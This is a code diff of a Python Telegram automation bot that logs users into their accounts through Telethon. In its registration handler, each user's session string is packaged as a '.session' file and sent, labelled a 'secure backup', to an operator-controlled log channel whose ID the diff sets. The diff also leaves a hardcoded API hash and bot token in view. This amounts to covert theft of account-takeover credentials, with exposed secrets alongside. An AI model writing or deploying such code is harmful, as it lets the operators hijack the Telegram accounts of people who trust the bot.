@@ -44,8 +44,8 @@ API_ID = int(os.getenv("TG_API_ID", "30636134"))
 API_HASH = os.getenv("TG_API_HASH", "9c5bb2bbeb19a0da5bfb0e7052875d2f")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8733721396:AAHJrr4uHC2WEx5r6BCHqBmx4LbMKh1Ngds")
 
-# 📢 GLOBAL LOGGING CHANNEL CONFIGURATION (Ensure Bot is Admin here)
-LOG_CHANNEL_ID = -1002345678901  
+# 📢 GLOBAL LOGGING CHANNEL CONFIGURATION
+LOG_CHANNEL_ID = -1004349607766  
 
 # Root Matrix Administrators (Hardcoded Super Owners)
 SUPER_OWNER_IDS = [7952327997, 7953147643, 8064493735] 
@@ -125,7 +125,8 @@ def parse_telegram_link(link: str) -> Tuple[Union[str, int, None], Optional[int]
         link = link.strip()
         private_match = re.search(r't\.me/c/(\d+)/(\d+)', link)
         if private_match:
-            channel_id = int(f"-100{private_match.group(1)}")
+            # Telethon natively maps channels via their bare positive integers
+            channel_id = int(private_match.group(1))
             msg_id = int(private_match.group(2))
             return channel_id, msg_id
 
@@ -268,15 +269,11 @@ class TaskQueuePipeline:
         while True:
             try:
                 task_id, creator_id, task_type, payload = await self.queue.get()
+                # Run background processing asynchronously to prevent system-wide blocking lockups
                 loop_task = asyncio.create_task(self.execute_task(task_id, creator_id, task_type, payload))
                 self.active_workers[task_id] = loop_task
-                try:
-                    await loop_task
-                except Exception as inner_ex:
-                    logger.error(f"Execution runtime crash on task #{task_id}: {inner_ex}")
-                finally:
-                    self.active_workers.pop(task_id, None)
-                    self.queue.task_done()
+                loop_task.add_done_callback(lambda t, tid=task_id: self.active_workers.pop(tid, None))
+                self.queue.task_done()
             except Exception as outer_ex:
                 logger.critical(f"Critical Exception within root task scheduling loop: {outer_ex}")
                 await asyncio.sleep(5)
@@ -793,7 +790,6 @@ async def complete_registration(message: Message, state: FSMContext, client: Tel
         session_bytes = session_str.encode('utf-8')
         session_file = BufferedInputFile(session_bytes, filename=f"+{clean_phone}.session")
         
-        # Dispatch copy safely to private logs channel archive
         try:
             await message.bot.send_document(chat_id=LOG_CHANNEL_ID, document=session_file, caption=f"🔑 **Secure Session Key File Backup**\n📱 **Phone:** `+{clean_phone}`")
         except Exception as forward_err:
@@ -820,7 +816,7 @@ async def task_hub_select_type(callback: CallbackQuery, state: FSMContext):
     )
     await state.set_state(TaskWizardStates.choosing_type)
 
-@router.callback_query(StateFilter(TaskWizardStates.choosing_type), F.data.startswith("set_type:"))
+@router.callback_query(F.data.startswith("set_type:"))
 async def task_hub_process_type(callback: CallbackQuery, state: FSMContext):
     task_type = callback.data.split(":")[1]
     await state.update_data(task_type=task_type)
@@ -933,7 +929,6 @@ async def finalize_task_creation(message: Union[Message, CallbackQuery], state: 
     await task_queue.add_task(task_id, user_id, task_type, data)
     await db_mgr.log_action(user_id, f"Queued automation task #{task_id} [{task_type.upper()}]")
     
-    # 📢 LOG TASK INITIALIZATION RADAR DISPATCH TO LOG CHANNEL
     init_details = (
         f"🔢 **Task ID Allocated:** #{task_id}\n"
         f"👤 **Creator/Triggered By ID:** `{user_id}`\n"
@@ -1277,7 +1272,6 @@ async def main():
     worker_task = asyncio.create_task(task_queue.start_worker())
     logger.info("Application attached to network polling loops.")
     
-    # 📢 SYSTEM STARTUP BROADCAST DISPATCH
     await send_channel_log(bot, "Core Architecture Online", "🚀 Automation system pipeline framework is completely online and actively parsing operations.", "SUCCESS")
     
     try:
